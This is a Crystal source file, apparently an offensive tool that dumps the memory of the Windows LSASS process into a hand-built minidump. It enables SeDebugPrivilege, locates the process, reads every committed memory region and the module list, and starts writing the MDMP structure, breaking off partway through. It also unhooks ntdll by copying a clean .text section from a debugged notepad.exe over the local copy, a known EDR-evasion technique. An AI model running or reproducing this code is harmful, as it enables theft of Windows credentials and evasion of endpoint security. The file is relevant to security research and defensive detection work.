require "option_parser"


@[Link("ntdll")]
lib Ntdll
  struct OSVERSIONINFOEXW
    dwOSVersionInfoSize : UInt32
    dwMajorVersion : UInt32
    dwMinorVersion : UInt32
    dwBuildNumber : UInt32
    dwPlatformId : UInt32
    szCSDVersion : UInt16[128]
    wServicePackMajor : UInt16
    wServicePackMinor : UInt16
    wSuiteMask : UInt16
    wProductType : UInt8
    wReserved : UInt8
  end
  fun RtlGetVersion(lpVersionInformation : OSVERSIONINFOEXW*) : Int32
  fun NtOpenProcessToken(hProcess : LibC::HANDLE, desiredAccess : UInt32, tokenHandle : Pointer(LibC::HANDLE)) : UInt32
  fun NtAdjustPrivilegesToken(tokenHandle : LibC::HANDLE, disableAllPrivileges : Int32, newState : Pointer(Void), bufferLength : UInt32, previousState : Pointer(Void), returnLength : Pointer(UInt32)) : UInt32
  fun NtGetNextProcess(process_handle : Pointer(Void), desired_access : UInt32, handle_attributes : UInt32, flags : UInt32, next_process : Pointer(Pointer(Void))) : Int32
  fun NtQueryInformationProcess(process_handle : Pointer(Void), process_info_class : UInt32, process_info : Pointer(UInt8), process_info_size : UInt32, return_length : Pointer(UInt32)) : UInt32
  fun NtReadVirtualMemory(process_handle : Pointer(Void), base_address : Pointer(Void), buffer : Pointer(UInt8), buffer_size : UInt64, bytes_read : Pointer(UInt64)) : UInt32
  fun NtQueryVirtualMemory(process_handle : Pointer(Void), base_address : Pointer(Void), memory_information_class : UInt32, memory_information : Pointer(UInt8), memory_information_length : UInt64, return_length : Pointer(UInt64)) : UInt32
  fun NtClose(handle : LibC::HANDLE) : UInt32
  fun NtTerminateProcess(process_handle : LibC::HANDLE, exit_status : Int32) : UInt32
  fun NtProtectVirtualMemory(process_handle : Pointer(Void), base_address : Pointer(Void), region_size : Pointer(UInt32),  new_protect : UInt32, old_protect : Pointer(UInt32)) : UInt32
end


@[Link("kernel32")]
lib Kernel32
  fun DebugActiveProcessStop(process_id : Int32) : Bool
  # fun CustomCreateProcessW(application_name : LibC::LPWSTR,command_line : LibC::LPWSTR,process_attributes : Pointer(Void),thread_attributes : Pointer(Void),inherit_handles : Bool,creation_flags : UInt32,environment : Pointer(Void),current_directory : LibC::LPWSTR,startup_info : Pointer(Void),process_information : Pointer(Void)) : Bool
end


# Constants
TOKEN_QUERY = 0x0008
TOKEN_ADJUST_PRIVILEGES = 0x0020
SE_PRIVILEGE_ENABLED = 0x0002
SE_DEBUG_NAME = "SeDebugPrivilege"
PAGE_NOACCESS = 0x01
MEM_COMMIT = 0x1000
MemoryBasicInformation = 0
DEBUG_PROCESS = 0x00000001_u32
PAGE_EXECUTE_WRITECOPY = 0x80_u32


# Structs
struct TOKEN_PRIVILEGES
  @privilege_count : UInt32
  @luid_low : UInt32
  @luid_high : UInt32
  @attributes : UInt32

  def initialize(privilege_count : UInt32, luid_low : UInt32, luid_high : UInt32, attributes : UInt32)
    @privilege_count = privilege_count
    @luid_low = luid_low
    @luid_high = luid_high
    @attributes = attributes
  end
end


struct ModuleInformation
  @base_dll_name : String
  @full_dll_path : String
  @dll_base : UInt64
  property size : UInt32

  def base_dll_name : String
    @base_dll_name
  end

  def full_dll_path : String
    @full_dll_path
  end

  def dll_base : UInt64
    @dll_base
  end

  def size : UInt32
    @size
  end

  def initialize(base_dll_name : String, full_dll_path : String, dll_base : UInt64, size : UInt32)
    @base_dll_name = base_dll_name
    @full_dll_path = full_dll_path
    @dll_base = dll_base
    @size = size
  end
end


struct MemFile
  @filename : String
  @content : Bytes
  @size : UInt32

  def filename : String
    @filename
  end

  def content : Bytes
    @content
  end

  def size : UInt32
    @size
  end

  def initialize(filename : String, content : Bytes, size : UInt32)
    @filename = filename
    @content = content
    @size = size
  end
end


struct MEMORY_BASIC_INFORMATION
  @base_address : UInt64
  @allocation_base : UInt64
  @allocation_protect : UInt32
  @region_size : UInt64
  @state : UInt32
  @protect : UInt32
  @type : UInt32

  def protect : UInt32
    @protect
  end

  def state : UInt32
    @state
  end

  def region_size : UInt64
    @region_size
  end

  def base_address : UInt64
    @base_address
  end

  def initialize(base_address : UInt64, allocation_base : UInt64, allocation_protect : UInt32, region_size : UInt64, state : UInt32, protect : UInt32, type : UInt32)
    @base_address = base_address
    @allocation_base = allocation_base
    @allocation_protect = allocation_protect
    @region_size = region_size
    @state = state
    @protect = protect
    @type = type
  end
end


struct STARTUPINFO
  property cb : Int32
  lp_reserved : Pointer(Void)
  lp_desktop : Pointer(UInt16) # LPWSTR
  lp_title : Pointer(UInt16)   # LPWSTR
  dw_x : Int32
  dw_y : Int32
  dw_x_size : Int32
  dw_y_size : Int32
  dw_x_count_chars : Int32
  dw_y_count_chars : Int32
  dw_fill_attribute : Int32
  dw_flags : Int32
  w_show_window : Int16
  cb_reserved2 : Int16
  lp_reserved2 : Pointer(Void)
  h_std_input : LibC::HANDLE
  h_std_output : LibC::HANDLE
  h_std_error : LibC::HANDLE

  def initialize
    @cb = sizeof(STARTUPINFO)   # Set the size of the struct
    @lp_reserved = Pointer(Void).null
    @lp_desktop = Pointer(UInt16).null
    @lp_title = Pointer(UInt16).null
    @dw_x = 0
    @dw_y = 0
    @dw_x_size = 0
    @dw_y_size = 0
    @dw_x_count_chars = 0
    @dw_y_count_chars = 0
    @dw_fill_attribute = 0
    @dw_flags = 0
    @w_show_window = 0
    @cb_reserved2 = 0
    @lp_reserved2 = Pointer(Void).null
    @h_std_input = LibC::HANDLE.new(0)
    @h_std_output = LibC::HANDLE.new(0)
    @h_std_error = LibC::HANDLE.new(0)
  end
end


struct PROCESS_INFORMATION
  property h_process : LibC::HANDLE
  property h_thread : LibC::HANDLE
  property dw_process_id : Int32
  property dw_thread_id : Int32

  # Initialize function
  def initialize(h_process : LibC::HANDLE, h_thread : LibC::HANDLE, dw_process_id : Int32, dw_thread_id : Int32)
    @h_process = h_process
    @h_thread = h_thread
    @dw_process_id = dw_process_id
    @dw_thread_id = dw_thread_id
  end

  # Getters
  def get_h_process : LibC::HANDLE
    @h_process
  end

  def get_h_thread : LibC::HANDLE
    @h_thread
  end

  def get_dw_process_id : Int32
    @dw_process_id
  end

  def get_dw_thread_id : Int32
    @dw_thread_id
  end
end


def getMemRegions(lsass_handle : Pointer(Void)) : Array(MemFile)
  proc_max_address = 0x7FFF_FFFE_FFFF_u64
  mem_address = 0_u64
  memfile_list = [] of MemFile
  aux_array = [] of String

  while mem_address < proc_max_address
    #puts "mem_address: 0x#{mem_address.to_s(16)}"

    # Populate MEMORY_BASIC_INFORMATION struct
    mbi = MEMORY_BASIC_INFORMATION.new(0, 0, 0, 0, 0, 0, 0)
    ntstatus = Ntdll.NtQueryVirtualMemory(
      lsass_handle,
      Pointer(Void).new(mem_address),
      MemoryBasicInformation,
      pointerof(mbi).as(Pointer(UInt8)),
      sizeof(MEMORY_BASIC_INFORMATION).to_u32,
      nil
    )

    if ntstatus != 0
      puts "[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x#{ntstatus.to_s(16)}"
      break
    end
    #puts "NTSTATUS: 0x#{ntstatus.to_s(16)}"

    # If readable and committed
    if mbi.protect != PAGE_NOACCESS && mbi.state == MEM_COMMIT
      buffer = Bytes.new(mbi.region_size.to_i32) # Create a buffer to read memory region
      # ntstatus = Ntdll.NtReadVirtualMemory(h_process, Pointer(Void).new(mem_address), buffer.to_unsafe, buffer.size.to_u32, bytes_read)
      read_status = Ntdll.NtReadVirtualMemory(
        lsass_handle,
        Pointer(Void).new(mbi.base_address), #mbi.base_address,
        buffer.to_unsafe, #pointerof(buffer).as(Pointer(Void)),
        mbi.region_size.to_u32,
        nil
      )

      if read_status != 0 && read_status != 0x8000000d
        puts "[-] Error reading memory. NTSTATUS: 0x#{read_status.to_s(16)}"
      else
        # Create a random filename for the memory dump
        memdump_filename = "#{mem_address.to_s(16)}" #"#{random_string(10)}.#{random_string(3)}"

        # Add memory info to JSON-like string array
        aux_array << %({"filename": "#{memdump_filename}", "address": "0x#{mem_address.to_s(16)}", "size": #{mbi.region_size}})

        # Add memory content to the memfile_list
        memfile_list << MemFile.new(memdump_filename, buffer, mbi.region_size.to_u32)
      end
    end

    # Next memory region
    mem_address += mbi.region_size
  end

  return memfile_list
end


def enable_se_debug_privilege
  hProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
  hToken = LibC::HANDLE.new(0.to_u64)  # Initialize hToken with 0

  # Open the current process token using NtOpenProcessToken
  ntstatus = Ntdll.NtOpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, pointerof(hToken))
  if ntstatus == 0 # STATUS_SUCCESS
    # Convert SE_DEBUG_NAME to a Pointer(UInt16) (UTF-16 encoding)
    se_debug_name_utf16 = SE_DEBUG_NAME.to_utf16
    se_debug_name_ptr = se_debug_name_utf16.to_unsafe

    token_privileges = TOKEN_PRIVILEGES.new(
      1,               # PrivilegeCount
      UInt32.new(20),
      UInt32.new(0),            # LUID
      0x00000002.to_u32 # SE_PRIVILEGE_ENABLED
    )

    ntstatus = Ntdll.NtAdjustPrivilegesToken(hToken, 0, pointerof(token_privileges), 0, nil, nil)
    if ntstatus == 0 # STATUS_SUCCESS
      puts "[+] SeDebugPrivilege enabled successfully!"
    else
      puts "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x#{ntstatus.to_s(16)}"
    end
  else
    puts "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x#{ntstatus.to_s(16)}"
  end
end


def readRemoteIntPtr(h_process : Pointer(Void), mem_address : UInt64) : UInt64
#def read_remote_intptr(h_process : UInt64, mem_address : UInt64) : UInt64
  buffer = StaticArray(UInt8, 8).new(0) # Equivalent to `byte[] buff = new byte[8]`
  bytes_read = Pointer(UInt64).malloc(1) # To store the number of bytes read

  ntstatus = Ntdll.NtReadVirtualMemory(h_process, Pointer(Void).new(mem_address.to_u64), buffer.to_unsafe, buffer.size.to_u32, bytes_read)

  if ntstatus != 0 && ntstatus != 0xC0000005_u32 && ntstatus != 0x8000000D_u32 && h_process != 0
    puts "[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x#{ntstatus.to_s(16)} reading address 0x#{mem_address.to_s(16)}"
  end

  # Convert buffer to Int64
  value = buffer.to_slice.to_unsafe.as(Pointer(Int64)).value

  return value.to_u64
end


def readRemoteWStr(h_process : Pointer(Void), mem_address : UInt64) : String
  buffer = StaticArray(UInt8, 256).new(0) # Equivalent to `byte[] buff = new byte[256]`
  bytes_read = Pointer(UInt64).malloc(1)  # To store the number of bytes read

  # Call NtReadVirtualMemory to read the remote memory
  ntstatus = Ntdll.NtReadVirtualMemory(h_process, Pointer(Void).new(mem_address), buffer.to_unsafe, buffer.size.to_u32, bytes_read)

  # Check for errors
  if ntstatus != 0 && ntstatus != 0xC0000005_u32 && ntstatus != 0x8000000D_u32 && !h_process.null?
    puts "[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x#{ntstatus.to_s(16)} reading address 0x#{mem_address.to_s(16)}"
  end

  # Convert the buffer into a Unicode string
  unicode_str = String.build do |str|
    i = 0
    while i < buffer.size - 1
      # Read 2 bytes at a time
      char_code = (buffer[i] | (buffer[i + 1] << 8)) # Combine two bytes into a UTF-16 code unit
      break if char_code == 0 # Null-terminated string
      str << char_code.chr
      i += 2
    end
  end

  return unicode_str
end


def get_proc_name_from_handle(process_handle : Pointer(Void)) : String
  #puts "Process handle: #{process_handle}"

  process_basic_information_size = 48_u32
  commandline_offset = 0x68

  # Create a byte array to hold PROCESS_BASIC_INFORMATION
  pbi_byte_array = Bytes.new(process_basic_information_size)

  # Pointer to PROCESS_BASIC_INFORMATION structure
  pbi_addr = Pointer(UInt8).null
  pbi_addr = pbi_byte_array.to_unsafe

  # Call NtQueryInformationProcess
  return_length = 0_u32
  ntstatus = Ntdll.NtQueryInformationProcess(process_handle, 0x0, pbi_addr, process_basic_information_size, pointerof(return_length))

  if ntstatus != 0
    puts "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x#{ntstatus.to_s(16)}"
    return ""
  end
  #puts "ntstatus: #{ntstatus}"
  
  peb_offset = 0x8
  peb_pointer = pbi_addr + peb_offset

  currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
  peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)

  processparameters_offset = 0x20
  processparameters_pointer = peb_address + processparameters_offset
  processparameters_address = readRemoteIntPtr(process_handle, processparameters_pointer)
  
  commandline_pointer = processparameters_address + commandline_offset
  commandline_address = readRemoteIntPtr(process_handle, commandline_pointer)
 
  commandline_value = readRemoteWStr(process_handle, commandline_address)

  #puts "peb_pointer: #{peb_pointer}"
  #puts "peb_address: \t\t\t 0x#{peb_address.to_s(16)}"
  #puts "processparameters_pointer: \t 0x#{processparameters_pointer.to_s(16)}"
  #puts "commandline_pointer: \t\t 0x#{commandline_pointer.to_s(16)}"
  #puts "commandline_address: \t\t 0x#{commandline_address.to_s(16)}"
  #puts "commandline_value: \t\t #{commandline_value}"
  #puts ""

  return commandline_value
end


def get_process_by_name(proc_name : String) : Pointer(Void)
  aux_handle = Pointer(Void).null
  maximum_allowed = 0x02000000

  while (Ntdll.NtGetNextProcess(aux_handle, maximum_allowed, 0, 0, pointerof(aux_handle)) == 0)
    commandline_value = get_proc_name_from_handle(aux_handle)
    if commandline_value.downcase == proc_name
      return aux_handle
    end
  end

  Pointer(Void).null
end


def custom_get_module_handle(h_process : Pointer(Void)) : Array(ModuleInformation)
  module_information_list = Array(ModuleInformation).new
  process_basic_information_size = 48_u32
  peb_offset = 0x8
  ldr_offset = 0x18
  in_initialization_order_module_list_offset = 0x30
  flink_dllbase_offset = 0x20
  flink_buffer_fulldllname_offset = 0x40
  flink_buffer_offset = 0x50

  # Pointer to PROCESS_BASIC_INFORMATION structure
  pbi_byte_array = Bytes.new(process_basic_information_size)
  pbi_addr = Pointer(UInt8).null
  pbi_addr = pbi_byte_array.to_unsafe


  # Call NtQueryInformationProcess
  return_length = 0_u32
  ntstatus = Ntdll.NtQueryInformationProcess(h_process, 0x0, pbi_addr, process_basic_information_size, pointerof(return_length))

  if ntstatus != 0
    puts "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x#{ntstatus.to_s(16)}"
    return module_information_list
  end
  #puts "ntstatus: #{ntstatus}"

  # Get PEB Base Address
  #peb_pointer = Pointer(UInt64).new(pbi_byte_array[peb_offset].to_u64)
  #peb_address = readRemoteIntPtr(h_process, peb_pointer.address)
  peb_pointer = pbi_addr + peb_offset
  currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
  peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)

  #puts "peb_pointer: 0x#{peb_pointer}"
  #puts "peb_address: 0x#{peb_address.to_s(16)}"

  # Get Ldr
  ldr_pointer = Pointer(UInt64).new(peb_address + ldr_offset)
  ldr_address = readRemoteIntPtr(h_process, ldr_pointer.address)

  in_initialization_order_module_list = ldr_address + in_initialization_order_module_list_offset
  next_flink = readRemoteIntPtr(h_process, in_initialization_order_module_list)

  dll_base = UInt64::MAX
  while dll_base != 0
    next_flink -= 0x10

    # Get DLL base address
    dll_base = readRemoteIntPtr(h_process, next_flink + flink_dllbase_offset)
    buffer = readRemoteIntPtr(h_process, next_flink + flink_buffer_offset)

    # DLL base name
    base_dll_name = ""
    if buffer != 0
      base_dll_name = readRemoteWStr(h_process, buffer)
    end

    # DLL full path
    full_dll_path = readRemoteWStr(h_process, readRemoteIntPtr(h_process, next_flink + flink_buffer_fulldllname_offset))

    if dll_base != 0
      #puts "#{base_dll_name.downcase} #{full_dll_path} #{dll_base.to_s(16)}"
      module_information_list << ModuleInformation.new(
        base_dll_name: base_dll_name,
        full_dll_path: full_dll_path.gsub("\\","\\\\"),
        dll_base: dll_base,
        size: 0
      )
    end

    next_flink = readRemoteIntPtr(h_process, next_flink + 0x10)
  end

  return module_information_list
end


def getModuleInfo(lsass_handle : Pointer(Void)) : Array(ModuleInformation)
  module_information_list = custom_get_module_handle(lsass_handle)
  #print_module_info(module_information_list)
  #loop_memory_regions(lsass_handle, module_information_list)

  proc_max_address = 0x7FFF_FFFE_FFFF_u64
  mem_address = 0_u64
  aux_size = 0
  aux_name = ""

  while mem_address < proc_max_address
    # puts "mem_address: 0x#{mem_address.to_s(16)}"

    # Populate MEMORY_BASIC_INFORMATION struct
    mbi = MEMORY_BASIC_INFORMATION.new(0, 0, 0, 0, 0, 0, 0)
    ntstatus = Ntdll.NtQueryVirtualMemory(
      lsass_handle,
      Pointer(Void).new(mem_address),
      MemoryBasicInformation,
      pointerof(mbi).as(Pointer(UInt8)),
      sizeof(MEMORY_BASIC_INFORMATION).to_u32,
      nil
    )

    if ntstatus != 0
      puts "[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x#{ntstatus.to_s(16)}"
      break
    end
    #puts "NTSTATUS: 0x#{ntstatus.to_s(16)}"

    # If readable and committed
    if mbi.protect != PAGE_NOACCESS && mbi.state == MEM_COMMIT
      #puts "aux_name: #{aux_name}"
      aux_module = module_information_list.find { |obj| obj.base_dll_name.downcase == aux_name.downcase }
      #if aux_module
      #  puts "aux_module.base_dll_name: #{aux_module.base_dll_name}"
      #end

      if mbi.region_size == 0x1000_u64 && mbi.base_address != aux_module.try(&.dll_base)
        if aux_module
          #puts "1) DLL Base: 0x#{aux_module.dll_base.to_s(16)} \t Size: #{aux_module.size} \t Base DLL Name: #{aux_module.base_dll_name}"
          aux_module.size = aux_size.to_u32
          #puts "2) DLL Base: 0x#{aux_module.dll_base.to_s(16)} \t Size: #{aux_module.size} \t Base DLL Name: #{aux_module.base_dll_name}"
          #aux_index = module_information_list.index { |module_info| module_info == aux_module }
          aux_index = module_information_list.index { |module_info| module_info.base_dll_name == aux_module.base_dll_name }
          #puts "---> aux_index: #{aux_index}"
          
          if aux_index
            module_information_list[aux_index] = aux_module
          else
            puts "Module not found in the list."
          end
        end

        module_information_list.each do |mod_info|
          if mbi.base_address == mod_info.dll_base
            ### puts "mem_address: 0x#{mem_address.to_s(16)} aux_name: #{aux_name} aux_size: #{aux_size}"
            aux_name = mod_info.base_dll_name.downcase
            aux_size = mbi.region_size.to_i
          end
        end
      else
        aux_size += mbi.region_size.to_i
      end
    end

    # Next memory region
    mem_address += mbi.region_size
  end

  return module_information_list # generateShockString(module_information_list)
end


def get_windows_version() : Ntdll::OSVERSIONINFOEXW
  os_info = Ntdll::OSVERSIONINFOEXW.new
  os_info.dwOSVersionInfoSize = 148

  result = Ntdll.RtlGetVersion(pointerof(os_info))
  if result == 0
    return os_info
  else
    raise "Failed to get Windows version. Error code: #{result}"
  end
end


def custom_get_module_address(h_process : Pointer(Void), module_name : String ) : UInt64
  process_basic_information_size = 48_u32
  peb_offset = 0x8
  ldr_offset = 0x18
  in_initialization_order_module_list_offset = 0x30
  flink_dllbase_offset = 0x20
  flink_buffer_fulldllname_offset = 0x40
  flink_buffer_offset = 0x50

  # Pointer to PROCESS_BASIC_INFORMATION structure
  pbi_byte_array = Bytes.new(process_basic_information_size)
  pbi_addr = Pointer(UInt8).null
  pbi_addr = pbi_byte_array.to_unsafe

  # Call NtQueryInformationProcess
  return_length = 0_u32
  ntstatus = Ntdll.NtQueryInformationProcess(h_process, 0x0, pbi_addr, process_basic_information_size, pointerof(return_length))

  if ntstatus != 0
    puts "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x#{ntstatus.to_s(16)}"
    return 0_u64
  end
  #puts "ntstatus: #{ntstatus}"

  # Get PEB Base Address
  #peb_pointer = Pointer(UInt64).new(pbi_byte_array[peb_offset].to_u64)
  #peb_address = readRemoteIntPtr(h_process, peb_pointer.address)
  peb_pointer = pbi_addr + peb_offset
  currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
  peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)

  #puts "peb_pointer: 0x#{peb_pointer}"
  #puts "peb_address: 0x#{peb_address.to_s(16)}"

  # Get Ldr
  ldr_pointer = Pointer(UInt64).new(peb_address + ldr_offset)
  ldr_address = readRemoteIntPtr(h_process, ldr_pointer.address)

  in_initialization_order_module_list = ldr_address + in_initialization_order_module_list_offset
  next_flink = readRemoteIntPtr(h_process, in_initialization_order_module_list)

  dll_base = UInt64::MAX
  while dll_base != 0
    next_flink -= 0x10

    # DLL base name
    buffer = readRemoteIntPtr(h_process, next_flink + flink_buffer_offset)
    base_dll_name = ""
    if buffer != 0
      base_dll_name = readRemoteWStr(h_process, buffer)
    end

    if base_dll_name == module_name
      # Get DLL base address
      dll_base = readRemoteIntPtr(h_process, next_flink + flink_dllbase_offset)
      return dll_base
    end
      
    next_flink = readRemoteIntPtr(h_process, next_flink + 0x10)
  end

  return 0_u64
end


# Function to check and get the text section info from an image
def get_text_section_info(ntdll_address : Pointer(Void)) : Array(UInt32)
  h_process = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1 #LibC.GetCurrentProcess()

  # Read e_lfanew at offset 0x3C (4 bytes)
  e_lfanew_data = Bytes.new(4)
  e_lfanew_address = ntdll_address + 0x3C
  Ntdll.NtReadVirtualMemory(h_process, e_lfanew_address, e_lfanew_data.to_unsafe, 4, Pointer(UInt64).null)

  e_lfanew = e_lfanew_data.to_unsafe.as(UInt32*).value #e_lfanew_data.unpack("I").first
  nt_headers_address = ntdll_address + e_lfanew
  optional_header_address = nt_headers_address + 24

  # Read SizeOfCode at offset 4 from Optional Header
  sizeofcode_address = optional_header_address + 4
  sizeofcode_data = Bytes.new(4)
  Ntdll.NtReadVirtualMemory(h_process, sizeofcode_address, sizeofcode_data.to_unsafe, sizeofcode_data.size, Pointer(UInt64).null)
  sizeofcode = sizeofcode_data.to_unsafe.as(UInt32*).value

  # Read BaseOfCode at offset 20 from Optional Header
  baseofcode_address = optional_header_address + 20
  baseofcode_data = Bytes.new(4)
  Ntdll.NtReadVirtualMemory(h_process, baseofcode_address, baseofcode_data.to_unsafe, baseofcode_data.size, Pointer(UInt64).null)

  baseofcode = baseofcode_data.to_unsafe.as(UInt32*).value

  # Return the BaseOfCode and SizeOfCode
  [baseofcode, sizeofcode]
end


# Function to create a debug process and copy ntdll.dll text section
def get_ntdll_from_debug_proc(process_path : String) : Pointer(UInt8)
  # Step 1: Create debug process
  si = LibC::STARTUPINFOW.new
  si.cb = sizeof(STARTUPINFO)
  #pi = LibC::PROCESS_INFORMATION.new(Pointer(Void).null, Pointer(Void).null, 0, 0)
  pi = LibC::PROCESS_INFORMATION.new
  pi.hProcess = Pointer(Void).null
  pi.hThread = Pointer(Void).null
  pi.dwProcessId = 0
  pi.dwThreadId = 0

  success = LibC.CreateProcessW(
    process_path.to_utf16, 
    nil, 
    Pointer(LibC::SECURITY_ATTRIBUTES).null, # Explicitly null for lpProcessAttributes
    Pointer(LibC::SECURITY_ATTRIBUTES).null, # Explicitly null for lpThreadAttributes
    false, 
    DEBUG_PROCESS, 
    Pointer(Void).null, 
    Pointer(UInt16).null, 
    pointerof(si), 
    pointerof(pi)
  )

  unless success
    puts "[-] Error calling CreateProcess"
    exit(1)
  end

  # Step 2: Retrieve local ntdll.dll address and text section info
  current_process = Pointer(Void).new(UInt64::MAX) # -1 (current process)
  local_ntdll_handle = custom_get_module_address(current_process, "ntdll.dll")
  result = get_text_section_info(Pointer(Void).new(local_ntdll_handle))
  local_ntdll_txt_base = result[0]
  local_ntdll_txt_size = result[1]
  local_ntdll_txt = local_ntdll_handle + local_ntdll_txt_base
    
  # Step 3: Read ntdll.dll text section into buffer
  ntdll_buffer = Bytes.new(local_ntdll_txt_size)
  read_result = Ntdll.NtReadVirtualMemory(pi.hProcess, Pointer(Void).new(local_ntdll_txt), ntdll_buffer.to_unsafe, ntdll_buffer.size, Pointer(UInt64).null)

  if read_result != 0
    puts "[-] Error calling NtReadVirtualMemory"
    exit(1)
  end

  # Step 4: Copy buffer pointer
  p_ntdll_buffer = Pointer(UInt8).null
  p_ntdll_buffer = ntdll_buffer.to_unsafe

  # Step 5: Cleanup and terminate debug process
  debug_stop_result = Kernel32.DebugActiveProcessStop(pi.dwProcessId)
  terminate_result = Ntdll.NtTerminateProcess(pi.hProcess, 0)

  unless debug_stop_result
    puts "#{debug_stop_result}"
    puts "[-] Error calling DebugActiveProcessStop"
    exit(1)
  end

  if terminate_result != 0
    puts "[-] Error calling NtTerminateProcess. NTSTATUS: 0x#{terminate_result.to_s(16)}"
    exit(1)
  end

  close_handle_proc = Ntdll.NtClose(pi.hProcess)
  close_handle_thread = Ntdll.NtClose(pi.hThread)

  if close_handle_proc != 0 || close_handle_thread != 0
    puts "[-] Error calling NtClose"
    exit(1)
  end

  # Return the buffer pointer
  p_ntdll_buffer
end


# Overwrite hooked ntdll .text section with a clean version
def replace_ntdll_txt_section(unhooked_ntdll_txt : Void*, local_ntdll_txt : Void*, local_ntdll_txt_size : UInt32)
  # VirtualProtect to PAGE_EXECUTE_WRITECOPY
  dw_old_protection = UInt32.new(0)
  current_process = Pointer(Void).new(UInt64::MAX) # -1_i32 # (HANDLE)(-1) is equivalent to the current process in Windows API
  local_ntdll_txt_size_uint = local_ntdll_txt_size.to_u32

  dw_old_protection = UInt32.new(0)
  vp_res = LibC.VirtualProtect(local_ntdll_txt, local_ntdll_txt_size.to_u32, PAGE_EXECUTE_WRITECOPY, pointerof(dw_old_protection))
  #vp_res = Ntdll.NtProtectVirtualMemory(
  #  current_process, 
  #  pointerof(local_ntdll_txt), 
  #  pointerof(local_ntdll_txt_size_uint), 
  #  PAGE_EXECUTE_WRITECOPY, 
  #  pointerof(dw_old_protection)
  #)
  if vp_res != 1      # != 0
    puts "[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)"
    puts "vp_res #{vp_res}"
    exit(1)
  end

  #STDIN.gets
  # Copy from one address to the other
  unhooked = unhooked_ntdll_txt.as(Pointer(UInt8))
  local = local_ntdll_txt.as(Pointer(UInt8))
  local_ntdll_txt_size.times do |i|
    local[i] = unhooked[i]
  end
  #STDIN.gets

  vp2_res = LibC.VirtualProtect(local_ntdll_txt, local_ntdll_txt_size.to_u32, dw_old_protection, pointerof(dw_old_protection))
  # VirtualProtect back to the original protection (PAGE_EXECUTE_READ)
  #vp_res2 = Ntdll.NtProtectVirtualMemory(
  #  current_process, 
  #  pointerof(local_ntdll_txt), 
  #  pointerof(local_ntdll_txt_size_uint), 
  #  dw_old_protection, 
  #  pointerof(dw_old_protection)
  #)
  if vp2_res != 1
    puts "[-] Error calling NtProtectVirtualMemory (restoring old protection)"
    exit(1)
  end
end


def replace_ntdll_txt_section()
  process_path = "C:\\Windows\\System32\\notepad.exe" # Change to target process
  unhookedNtdllTxt = get_ntdll_from_debug_proc(process_path)
  #puts "Ntdll text section copied to buffer at: 0x#{unhookedNtdllTxt.address.to_s(16)}"

  currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
  localNtdllHandle = custom_get_module_address(currentProcess, "ntdll.dll")
  result = get_text_section_info(Pointer(Void).new(localNtdllHandle))
  localNtdllTxtBase = result[0]
  localNtdllTxtSize = result[1]
  localNtdllTxt = localNtdllHandle + localNtdllTxtBase
  puts "[+] Replacing 0x#{localNtdllTxtSize.to_s(16)} bytes from 0x#{unhookedNtdllTxt.address.to_s(16)} to 0x#{localNtdllTxt.to_s(16)}"
  replace_ntdll_txt_section(unhookedNtdllTxt.as(Pointer(Void)), Pointer(Void).new(localNtdllTxt), localNtdllTxtSize)
end


def print_module_info(module_information_list : Array(ModuleInformation)) : String
  # Iterate over the module_information_list and print its elements
  module_information_list.each do |module_info|
    #puts "Base DLL Name: \t#{module_info.base_dll_name} " #\t Full DLL Path: \t#{module_info.full_dll_path}"
    puts "DLL Base: 0x#{module_info.dll_base.to_s(16)} \t Size: #{module_info.size} \t Base DLL Name: #{module_info.base_dll_name}"
    #puts "--------------------------------------"
  end
  return ""
end


def uint32_to_little_endian_bytes(value : UInt32) : Bytes
  io = IO::Memory.new
  io.write_bytes(value, IO::ByteFormat::LittleEndian)
  return io.to_slice
end


def uint64_to_little_endian_bytes(value : UInt64) : Bytes
  io = IO::Memory.new
  io.write_bytes(value, IO::ByteFormat::LittleEndian)
  io.to_slice
end


def hex_string_to_little_endian_bytes(hex_string : String) : Bytes
  value = hex_string.to_u64(16)
  io = IO::Memory.new
  io.write_bytes(value, IO::ByteFormat::LittleEndian)
  return io.to_slice
end


def generate_bytes(os_info : Ntdll::OSVERSIONINFOEXW, module_information_list : Array(ModuleInformation), memfile_list : Array(MemFile)) : Bytes
  number_modules = module_information_list.size
  modulelist_size = 4 + 108 * number_modules
  
  module_information_list.each do |module_info|
    #puts "#{module_info.full_dll_path.gsub("\\\\","\\").bytesize}\t#{module_info.full_dll_path.gsub("\\\\","\\")}"
    modulelist_size += (module_info.full_dll_path.gsub("\\\\","\\").bytesize * 2 + 8)
  end
  
  mem64list_offset = modulelist_size + 0x7C
  
  mem64list_size = 16 + 16 * memfile_list.size
  offset_memory_regions = mem64list_offset + mem64list_size

  puts "[+] Total number of modules:    #{number_modules}"
  puts "[+] ModuleListStream size:      #{modulelist_size}"
  puts "[+] Mem64List offset:           #{mem64list_offset}"
  puts "[+] Mem64List size:             #{mem64list_size}"

  header = Bytes[0x4D, 0x44, 0x4D, 0x50] +
           Bytes[0x93, 0xA7] +
           Bytes[0x00, 0x00] +
           Bytes[0x03, 0x00, 0x00, 0x00] +
           Bytes[0x20, 0x00, 0x00, 0x00] +
           Bytes.new(32 - 16)

  bytes = uint32_to_little_endian_bytes(modulelist_size.to_u32)
  
  stream_directory = Bytes[0x04, 0x00, 0x00, 0x00] +
                     uint32_to_little_endian_bytes(modulelist_size.to_u32) +
                     Bytes[0x7C, 0x00, 0x00, 0x00] +
